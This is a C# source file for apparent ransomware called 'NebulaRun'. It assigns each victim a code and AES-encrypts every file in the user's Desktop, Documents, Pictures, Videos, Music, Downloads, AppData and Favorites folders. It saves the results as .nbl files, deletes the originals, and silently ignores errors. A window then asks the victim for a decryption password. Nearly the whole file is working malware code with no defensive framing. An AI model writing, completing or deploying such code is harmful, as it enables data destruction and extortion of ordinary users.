using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace NebulaRun
{ //encryption & decryption 
    public partial class Nbl : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        public Nbl()
        {
            InitializeComponent();

            LoadEmbeddedImage();

            labelVictimCode.Text = "Victim Code: " + VictimCode;

            this.MouseDown += Nbl_MouseDown;

            
            buttonDecrypt.Click += buttonDecrypt_Click;
        }

        private void Nbl_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(this.Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }

        private void LoadEmbeddedImage()
        {
            var asm = Assembly.GetExecutingAssembly();
            string resourceName = "NebulaRun.nebula.png";

            using (var stream = asm.GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                {
                    pictureBoxNebula.Image = Image.FromStream(stream);
                }
                else
                {
                }
            }
        }

        private static readonly string[] TargetDirs = {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
        };

        public static string VictimCode { get; private set; }

        public static void GenerateVictimCode()
        {
            VictimCode = Guid.NewGuid().ToString().ToUpper();
        }

        public static byte[] AESKey;
        public static byte[] AESIV;

        public static void EncryptAll()
        {
            using (Aes aes = Aes.Create())
            {
                GenerateVictimCode();
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                aes.GenerateKey();
                aes.GenerateIV();

                AESKey = aes.Key;
                AESIV = aes.IV;

                foreach (string dir in TargetDirs)
                {
                    if (Directory.Exists(dir))
                        EncryptDirectory(dir, aes.Key, aes.IV);
                }
            }
        }

        private static void EncryptDirectory(string dir, byte[] key, byte[] iv)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    if (!file.EndsWith(".nbl"))
                        EncryptFile(file, key, iv);
                }

                foreach (string subDir in Directory.GetDirectories(dir))
                {
                    EncryptDirectory(subDir, key, iv);
                }
            }
            catch { }
        }

        private static void EncryptFile(string filePath, byte[] key, byte[] iv)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (MemoryStream ms = new MemoryStream())
                    {
                        
                        ms.Write(iv, 0, iv.Length);

                        using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(fileData, 0, fileData.Length);
                            cs.FlushFinalBlock();
                        }
                        File.WriteAllBytes(filePath + ".nbl", ms.ToArray());
                        File.Delete(filePath);
                    }
                }
            }
            catch { }
        }


        public static string GetBase64Key() => Convert.ToBase64String(AESKey);
        public static string GetBase64IV() => Convert.ToBase64String(AESIV);

        
        private void buttonDecrypt_Click(object sender, EventArgs e)
        {
            string password = textBoxDecryptPassword.Text;
            if (string.IsNullOrWhiteSpace(password))
            {
                MessageBox.Show("ERROR", "NEBULA", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            try
            {
                byte[] key = Encoding.UTF8.GetBytes(password);
                
                if (key.Length < 16)
                {
                    Array.Resize(ref key, 16);
                }
                else if (key.Length > 16)
                {
                    Array.Resize(ref key, 16);
                }

                foreach (string dir in TargetDirs)
                {
                    if (Directory.Exists(dir))
                        DecryptDirectory(dir, key);
                }

                MessageBox.Show("Done", "NEBULA", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch
            {
                MessageBox.Show("ERROR", "NEBULA", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static void DecryptDirectory(string dir, byte[] key)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir, "*.nbl"))
                {
                    DecryptFile(file, key);
                }

                foreach (string subDir in Directory.GetDirectories(dir))
                {
                    DecryptDirectory(subDir, key);
                }
            }
            catch { }
        }

        private void buttonClose_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void notifyIcon_DoubleClick(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
            this.BringToFront();
        }
        private static void DecryptFile(string filePath, byte[] key)
        {
            try
            {
                byte[] encryptedData = File.ReadAllBytes(filePath);

                
                byte[] iv = new byte[16];
                Array.Copy(encryptedData, 0, iv, 0, 16);

               
                byte[] actualEncrypted = new byte[encryptedData.Length - 16];
                Array.Copy(encryptedData, 16, actualEncrypted, 0, actualEncrypted.Length);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (MemoryStream ms = new MemoryStream())
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(actualEncrypted, 0, actualEncrypted.Length);
                        cs.FlushFinalBlock();

                        string originalFilePath = filePath.Substring(0, filePath.Length - 4);
                        File.WriteAllBytes(originalFilePath, ms.ToArray());
                        File.Delete(filePath);
                    }
                }
            }
            catch { }
        }


        private void Nbl_Load(object sender, EventArgs e)
        {

        }
    }
}
